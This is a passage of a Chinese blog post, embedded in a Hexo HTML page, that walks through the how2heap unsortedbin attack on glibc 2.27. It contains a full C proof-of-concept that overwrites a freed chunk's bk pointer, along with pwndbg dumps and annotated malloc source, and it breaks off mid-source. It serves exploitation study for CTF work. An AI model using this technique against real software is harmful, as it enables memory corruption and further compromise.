@@ -1,0 +1,295 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>how2heap(14)-unsortedbin attack | Cyberangel's Blog</title><meta name="author" content="Cyberangel"><meta name="copyright" content="Cyberangel"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="how2heap(14)-unsortedbin attack前言这一小节我们重新来看一下unsortedbin attack，这个作用是想某个地址中写入超大值，除了这一点，我们可以向global_max_fast写入一个超大值，从而使用fastbin attack进行攻击。 影响版本glibc &lt;&#x3D; version 2.27（不清楚glibc 2.28是否修复，懒得看了） POC">
+<meta property="og:type" content="article">
+<meta property="og:title" content="how2heap(14)-unsortedbin attack">
+<meta property="og:url" content="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/%E3%80%8Aglibc%202.27%20malloc%E6%BC%8F%E6%B4%9E%E8%A7%A3%E8%AF%BB%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88how2heap%EF%BC%89%E3%80%8B/2-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E8%AF%BB/how2heap(14)-unsortedbin%20attack/index.html">
+<meta property="og:site_name" content="Cyberangel&#39;s Blog">
+<meta property="og:description" content="how2heap(14)-unsortedbin attack前言这一小节我们重新来看一下unsortedbin attack，这个作用是想某个地址中写入超大值，除了这一点，我们可以向global_max_fast写入一个超大值，从而使用fastbin attack进行攻击。 影响版本glibc &lt;&#x3D; version 2.27（不清楚glibc 2.28是否修复，懒得看了） POC">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picsum.photos/seed/blog-cover-03/800/450">
+<meta property="article:published_time" content="2021-05-18T07:48:53.000Z">
+<meta property="article:modified_time" content="2026-07-03T14:46:16.691Z">
+<meta property="article:author" content="Cyberangel">
+<meta property="article:tag" content="二进制安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picsum.photos/seed/blog-cover-03/800/450"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "how2heap(14)-unsortedbin attack",
+  "url": "https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/%E3%80%8Aglibc%202.27%20malloc%E6%BC%8F%E6%B4%9E%E8%A7%A3%E8%AF%BB%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88how2heap%EF%BC%89%E3%80%8B/2-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E8%AF%BB/how2heap(14)-unsortedbin%20attack/",
+  "image": "https://picsum.photos/seed/blog-cover-03/800/450",
+  "datePublished": "2021-05-18T07:48:53.000Z",
+  "dateModified": "2026-07-03T14:46:16.691Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Cyberangel",
+      "url": "https://elydemiurge.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/%E3%80%8Aglibc%202.27%20malloc%E6%BC%8F%E6%B4%9E%E8%A7%A3%E8%AF%BB%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88how2heap%EF%BC%89%E3%80%8B/2-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E8%AF%BB/how2heap(14)-unsortedbin%20attack/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'how2heap(14)-unsortedbin attack',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Cyberangel's Blog" type="application/atom+xml">
+</head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://picsum.photos/seed/blog-cover-03/800/450);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Cyberangel's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">how2heap(14)-unsortedbin attack</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">how2heap(14)-unsortedbin attack</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-18T07:48:53.000Z" title="发表于 2021-05-18 15:48:53">2021-05-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-03T14:46:16.691Z" title="更新于 2026-07-03 22:46:16">2026-07-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/">公开知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="how2heap-14-unsortedbin-attack"><a href="#how2heap-14-unsortedbin-attack" class="headerlink" title="how2heap(14)-unsortedbin attack"></a>how2heap(14)-unsortedbin attack</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这一小节我们重新来看一下unsortedbin attack，这个作用是想某个地址中写入超大值，除了这一点，<span style="color: #F5222D">我们可以向global_max_fast写入一个超大值，从而使用fastbin attack进行攻击。</span></p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>glibc &lt;&#x3D; version 2.27（不清楚glibc 2.28是否修复，懒得看了）</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><h3 id="POC源码"><a href="#POC源码" class="headerlink" title="POC源码"></a>POC源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This technique only works with buffers not going into tcache, either because the tcache-option for &quot;</span></span><br><span class="line">		    <span class="string">&quot;glibc was disabled, or because the buffers are bigger than 0x408 bytes. See build_glibc.sh for build &quot;</span></span><br><span class="line">		    <span class="string">&quot;instructions.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">		   <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">volatile</span> <span class="type">unsigned</span> <span class="type">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *p=<span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">		   <span class="string">&quot;point to %p\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">	p[<span class="number">1</span>]=(<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span></span><br><span class="line">		   <span class="string">&quot;rewritten:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">	assert(stack_var != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><p>在POC的开头打印出了我们需要控制的地址：stack_var（b 17-&gt;r）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">	<span class="keyword">volatile</span> <span class="type">unsigned</span> <span class="type">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line">#Let<span class="string">&#x27;s first look at the target we want to rewrite on stack:</span></span><br><span class="line"><span class="string">#0x7fffffffddc8: 0</span></span><br></pre></td></tr></table></figure>
+
+<p>stack_var的内存状况如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx &amp;stack_var</span><br><span class="line"><span class="number">0x7fffffffddc8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007fffffffdec0</span></span><br><span class="line"><span class="number">0x7fffffffddd8</span>:	<span class="number">0x76f1b24f6509d200</span>	<span class="number">0x0000555555554a60</span></span><br><span class="line"><span class="number">0x7fffffffdde8</span>:	<span class="number">0x00007ffff7a03bf7</span>	<span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x7fffffffddf8</span>:	<span class="number">0x00007fffffffdec8</span>	<span class="number">0x000000010000c000</span></span><br><span class="line"><span class="number">0x7fffffffde08</span>:	<span class="number">0x000055555555481a</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffde18</span>:	<span class="number">0x442287353d921ff8</span>	<span class="number">0x0000555555554710</span></span><br><span class="line"><span class="number">0x7fffffffde28</span>:	<span class="number">0x00007fffffffdec0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffde38</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x1177d26012b21ff8</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们创建两个堆块，其中第一个堆块当作我们的victim，第二个堆块是为了防止第一个堆块free后与top_chunk合并，可以遇见的是在free掉victim堆块之后它会进入到unsortedbin中；另外第一个堆块的大小不能属于tcachebin和smallbin（b 24-&gt;c）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p=<span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">          <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p);</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span> <span class="meta">#tcachebin</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000421</span> #chunk_victim</span><br><span class="line"><span class="number">0x555555757260</span>:	<span class="number">0x00007ffff7dcdca0</span>	<span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757670</span>:	<span class="number">0x0000000000000420</span>	<span class="number">0x0000000000000200</span> <span class="meta">#chunk--avoid top_chunk</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757870</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020791</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757950</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/posts/how2heap-14-unsortedbin-attack-spgu7x/assets/1621325134515-b681e9d2-d666-493f-9a1d-df4fa983879a.png" alt="截屏2021-05-18 16.05.28.png"></p>
+<p>假如现在有堆溢出或UAF漏洞可以修改chunk_victim的bk指针到之前的stack_var（你没看错，又是bk指针）（b 35-&gt;c）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">	   <span class="string">&quot;point to %p\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">p[<span class="number">1</span>]=(<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br></pre></td></tr></table></figure>
+
+<p>效果如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span> <span class="meta">#tcachebin</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000421</span> #chunk_victim</span><br><span class="line"><span class="number">0x555555757260</span>:	<span class="number">0x00007ffff7dcdca0</span>	<span class="number">0x00007fffffffddb8</span></span><br><span class="line">    							   #stack_var</span><br><span class="line">    							   #<span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757670</span>:	<span class="number">0x0000000000000420</span>	<span class="number">0x0000000000000200</span> <span class="meta">#chunk--avoid top_chunk</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757870</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020791</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757950</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/posts/how2heap-14-unsortedbin-attack-spgu7x/assets/1621325405363-407ac8e7-529b-4c9c-854e-9450fa18d7bd.png" alt="截屏2021-05-18 16.09.59.png"></p>
+<p>接下来是重点，我们将把chunk_victim从unsortedbin中申请出来：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里选择引入源码调试，重点malloc源码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) <span class="comment">//victim==0x555555757250</span></span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk; <span class="comment">//bck==0x7fffffffddb8</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">		   &gt; av-&gt;system_mem, <span class="number">0</span>)) <span class="comment">//检查堆块的大小是否异常</span></span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br><span class="line">        size = chunksize (victim); <span class="comment">//size==0x420</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">           only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">           runs of 